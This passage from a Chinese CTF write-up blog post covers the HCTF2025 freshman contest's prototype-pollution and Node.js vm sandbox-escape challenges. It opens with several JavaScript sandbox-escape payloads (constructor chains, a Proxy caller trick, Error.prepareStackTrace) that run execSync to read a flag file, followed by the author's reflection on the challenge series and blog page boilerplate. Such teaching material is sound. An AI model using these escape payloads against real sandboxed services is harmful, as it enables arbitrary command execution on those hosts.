function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>)).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;execSync&#x27;</span>) ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>).<span class="hljs-title function_">toString</span>() : <span class="hljs-string">&#x27;fail&#x27;</span>)<br><br><span class="hljs-comment">// Proxy+caller 构造器链：通过 arguments.callee.caller 获取调用者，再通过其构造器获得 Function 构造器，进而执行命令</span><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <br>    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <br>        <span class="hljs-keyword">const</span> cc = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>; <br>        <span class="hljs-keyword">const</span> p = (cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))(); <br>        <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>() <br>    &#125;  <br>&#125;)<br><br><span class="hljs-comment">// Error.prepareStackTrace链：通过堆栈对象中的 getThis 方法，获取构造器链，最终获得 Function 构造器并执行命令</span><br><span class="hljs-title class_">Error</span>.<span class="hljs-property">prepareStackTrace</span> = <span class="hljs-function">(<span class="hljs-params">_, stack</span>) =&gt;</span> stack;<br><span class="hljs-keyword">var</span> err = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>();<br><span class="hljs-keyword">var</span> stack = err.<span class="hljs-property">stack</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stack[<span class="hljs-number">0</span>].<span class="hljs-title function_">getThis</span>().<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>).<span class="hljs-title function_">toString</span>())<br></code></pre></td></tr></table></figure>
+
+<p>获得flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149045.png" srcset="/img/loading.gif" lazyload alt="image-20250819035527733"></p>
+<p>原理网上有很多文章，搜”vm沙箱逃逸“即可，ai也能讲。</p>
+<p>回头再看，污染系列还是出的还是比较用心的，每一题也尽量让大家学到东西，比赛没做出来不要紧，以学习为主。</p>
+<p><strong>污染入门：权限劫持</strong>，一个套了<code>原型链污染</code>壳的POST传参题，不至于太俗，又可以从一个较为简单的难度入手原型链污染；</p>
+<p><strong>污染联动：模板魔法</strong>，强化了原型链污染后需要触发利用的意识，并且练习了通过原型链污染命令执行的手法，ejs模板引擎是Node最常用的引擎之一，通过深入调试ejs模板引擎，了解原型链污染的实际场景。</p>
+<p><strong>污染终极：越狱之路</strong>，简单提了一下原型链污染的绕过技术，然后用到了node内置模块vm的沙箱逃逸，从而把整套题目向node安全进行拓展。</p>
+<p>关键的是尽可能情景化，都是对网站实际的功能点进行漏洞利用，尽可能让大家体会到web安全相对真实的场景。第一道是一个鉴权，验证是否是VIP；第二道是评论功能，并且变相的给了源码；第三道是有过滤的鉴权（可以说这里上了一点攻防），鉴权之后有一个代码练习的功能。</p>
+<p>考虑到新生赛，所以没出啥新奇东西，整套题的提示也挺明显（大致方向都给了），漏洞利用技巧也很常见（各种文章网上有很多），主要是在知识点上难为大家，而不是对脑洞。比较中正平和，还是那句话，力求让大家学到东西。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8A%9E%E8%B5%9B/" class="print-no-link">#办赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HCTF2025新生赛</div>
+      <div>http://example.com/2026/test34/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test44/" title="羊城杯2025决赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">羊城杯2025决赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test63/" title="春秋云镜 GreatWall_2025">
+                        <span class="hidden-mobile">春秋云镜 GreatWall_2025</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
